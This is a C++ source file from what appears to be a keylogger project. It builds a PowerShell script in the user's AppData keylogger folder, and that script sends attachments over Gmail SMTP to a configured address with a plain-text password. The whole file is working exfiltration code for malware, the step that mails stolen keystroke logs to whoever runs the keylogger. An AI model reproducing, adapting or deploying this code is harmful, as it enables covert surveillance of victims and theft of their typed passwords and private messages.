#include "PowerShellSendMailScriptCreator.h"

#include "KeyloggerDirectoryLocator.h"
#include "exceptions/FileNotFound.h"

namespace keylogger::mail
{
PowerShellSendMailScriptCreator::PowerShellSendMailScriptCreator(
    std::shared_ptr<FileSystemAccess> fileSystemAccessInit)
    : fileSystem{std::move(fileSystemAccessInit)}, scriptName{"sendMail.ps1"}
{
}

bool PowerShellSendMailScriptCreator::createScript(const Mail& mail, const Credentials& credentials)
{
    const std::string scriptDirectory = KeyloggerDirectoryLocator::getAppDataKeyloggerPath(true);
    scriptAbsoluteFilePath = scriptDirectory + scriptName;
    const auto scriptBody = constructFormattedScriptBody(mail, credentials);

    try
    {
        fileSystem->createDirectory(scriptDirectory);
        fileSystem->tryToWrite(scriptAbsoluteFilePath, scriptBody);
    }
    catch (const exceptions::FileNotFound&)
    {
        return false;
    }
    return true;
}

std::string PowerShellSendMailScriptCreator::getScriptFilePath() const
{
    return scriptAbsoluteFilePath;
}

std::string PowerShellSendMailScriptCreator::constructFormattedScriptBody(const Mail& mail,
                                                                          const Credentials& credentials)
{
    std::string scriptFunctionDefinitionPart = R"(
    Param(
   [String]$Att,
   [String]$Subj,
   [String]$Body
    )

Function Send-EMail
    {
    Param (
        [Parameter(`
            Mandatory=$true)]
        [String]$To,
         [Parameter(`
            Mandatory=$true)]
        [String]$From,
        [Parameter(`
            mandatory=$true)]
        [String]$Password,
        [Parameter(`
            Mandatory=$true)]
        [String]$Subject,
        [Parameter(`
            Mandatory=$true)]
        [String]$Body,
        [Parameter(`
            Mandatory=$false)]
        [String]$attachment
    )
    try
        {
            $Msg = New-Object System.Net.Mail.MailMessage($From, $To, $Subject, $Body)
            $Srv = "smtp.gmail.com"
            if ($attachment)
            {
                try
                    {
                        $Attachments = $attachment -split ("\:\:");
                        ForEach ($val in $Attachments)
                            {
                                $attch = New-Object System.Net.Mail.Attachment($val)
                                $Msg.Attachments.Add($attch)
                            }
                    }
                catch
                    {
                        exit 2; #attachment not found
                    }
            }
            $Client = New-Object Net.Mail.SmtpClient($Srv, 587) #587 port for smtp.gmail.com SSL
            $Client.EnableSsl = $true
            $Client.Credentials = New-Object System.Net.NetworkCredential($From.Split("@")[0], $Password);
            $Client.Send($Msg)
            Remove-Variable -Name Client
            Remove-Variable -Name Password
            exit 7; #everything went OK
          }
      catch
          {
            exit 3;
          }
    }
)";
    std::string scriptFunctionCallPart = {
        "try\n    {\n        "
        "if ($Att)\n        {\n"
        "          Send-EMail -attachment $Att "
        "-To \"" +
        std::string(mail.emailTargetAddress) +
        "\""
        " -Body $Body -Subject $Subj "
        "-password \"" +
        std::string(credentials.password) +
        "\""
        " -From \"" +
        std::string(mail.emailSourceAddress) +
        "\"\n        }\n        else\n        {\n"
        "          Send-EMail "
        "-To \"" +
        std::string(mail.emailTargetAddress) +
        "\""
        " -Body $Body -Subject $Subj "
        "-password \"" +
        std::string(credentials.password) +
        "\""
        " -From \"" +
        std::string(mail.emailSourceAddress) +
        "\""
        "\n        }\n}\r\ncatch\n    {\n        exit 4; #not enough parameters\n    }"};

    return scriptFunctionDefinitionPart + scriptFunctionCallPart;
}

}